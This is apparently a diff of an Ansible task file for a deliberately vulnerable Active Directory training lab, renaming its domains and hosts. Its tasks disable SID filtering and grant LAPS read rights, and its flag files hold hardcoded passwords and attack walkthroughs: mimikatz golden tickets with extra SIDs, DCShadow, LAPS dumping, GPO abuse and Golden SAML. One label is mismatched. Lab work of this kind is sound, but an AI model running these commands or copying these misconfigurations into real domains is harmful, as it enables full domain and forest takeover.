@@ -1,7 +1,7 @@
 ---
 # ==============================================================================
 # vuln_lat_df_extended/tasks/trust_abuse.yml — DF-081..100
-# Trust abuse + SID history + cross-forest attacks (dc01.corp.local only)
+# Trust abuse + SID history + cross-forest attacks (coruscant.empire.local only)
 # ==============================================================================
 
 # DF-081: ExtraSID injection into cross-forest TGTs
@@ -13,7 +13,7 @@
     $changes = 0
     foreach ($t in $trusts) {
       if ($t.SIDFilteringQuarantined -or $t.SIDFilteringForestAware) {
-        netdom trust $($t.Name) /domain:$($t.Source) /quarantine:no /usero:Administrator /passwordo:DVADlab2024! 2>&1
+        netdom trust $($t.Name) /domain:$($t.Source) /quarantine:no /usero:Administrator /passwordo:SithLord123! 2>&1
         $changes++
       }
     }
@@ -83,7 +83,7 @@
 - name: DF-085 - Grant svc_monitoring read on ms-Mcs-AdmPwd
   ansible.windows.win_shell: |
     Import-Module ActiveDirectory
-    # LAPS read right for svc_monitoring on all computer objects in corp.local
+    # LAPS read right for svc_monitoring on all computer objects in empire.local
     $sid = (Get-ADUser -Identity 'svc_monitoring' -ErrorAction SilentlyContinue).SID
     if (-not $sid) { Write-Output "skipped"; exit 0 }
     $domainDN = (Get-ADDomain).DistinguishedName
@@ -121,13 +121,13 @@
         =========================================================
         SID filtering DISABLED on all trusts. ExtraSIDs in PAC pass across forest boundaries.
 
-        From corp.local (with DA):
-          1. Get corp.local krbtgt hash (DCSync — CRED-013/099)
-          2. Get root.corp Enterprise Admins SID: S-1-5-21-ROOT-519
+        From empire.local (with DA):
+          1. Get empire.local krbtgt hash (DCSync — CRED-013/099)
+          2. Get trade.corp Enterprise Admins SID: S-1-5-21-TRADE-519
           3. Create inter-realm Golden Ticket with extra SID injected:
-             mimikatz# kerberos::golden /user:Administrator /domain:corp.local \
-               /sid:S-1-5-21-CORP /sids:S-1-5-21-ROOT-519 /krbtgt:<hash> /ptt
-          4. Access root.corp as Enterprise Admin
+             mimikatz# kerberos::golden /user:Administrator /domain:empire.local \
+               /sid:S-1-5-21-EMPIRE /sids:S-1-5-21-TRADE-519 /krbtgt:<hash> /ptt
+          4. Access trade.corp as Enterprise Admin
 
     - path: 'C:\Flags\FLAG-DF-083-GPOAbuse.txt'
       content: |
@@ -142,7 +142,7 @@
 
           Pwnkit (PowerView GPO link abuse):
             $gpo = Get-DomainGPO -Identity "Default Domain Policy"
-            New-GPLink -Name "Malicious GPO" -Target "DC=corp,DC=local"
+            New-GPLink -Name "Malicious GPO" -Target "DC=empire,DC=local"
             Set-GPRegistryValue -Name "Malicious GPO" -Key "HKLM\Software\..." -ValueName ... -Value ...
 
     - path: 'C:\Flags\FLAG-DF-087-LAPSRead.txt'
@@ -153,15 +153,15 @@
         IT_Team group has LAPS read access (LAT-023).
 
         Extract LAPS passwords:
-          Get-ADComputer -Identity ws01 -Properties ms-Mcs-AdmPwd | Select -ExpandProperty ms-Mcs-AdmPwd
+          Get-ADComputer -Identity tatooine -Properties ms-Mcs-AdmPwd | Select -ExpandProperty ms-Mcs-AdmPwd
           crackmapexec ldap 10.10.0.10 -u svc_monitoring -p Monitor2024! -M laps
-          Get-LAPSPassword -HostName ws01 -Credential $cred
+          Get-LAPSPassword -HostName tatooine -Credential $cred
 
     - path: 'C:\Flags\FLAG-DF-090-DCShadow.txt'
       content: |
         DF-090: DCShadow Attack
         ========================
-        From DA context in corp.local, register rogue DC and push objects:
+        From DA context in empire.local, register rogue DC and push objects:
 
           mimikatz# lsadump::dcshadow /object:krbtgt /attribute:unicodePwd \
             /value:NewKrbtgtPass2024!
@@ -174,9 +174,9 @@
         DF-095..100: PKI + Entra Hybrid Attack Chains
         ===============================================
         ESC1 cert → Entra hybrid join:
-          1. Get corp.local admin cert via ESC1 (ADCS)
-          2. corp.local admin → sync to Entra via MSOL_sync account (CLO-001)
-          3. Use corp.local hash/cert to authenticate to Entra as Global Admin
+          1. Get empire.local admin cert via ESC1 (ADCS)
+          2. empire.local admin → sync to Entra via MSOL_sync account (CLO-001)
+          3. Use empire.local hash/cert to authenticate to Entra as Global Admin
 
         Golden SAML (DF-100):
           With access to AD FS signing cert (svc_adfs compromise):
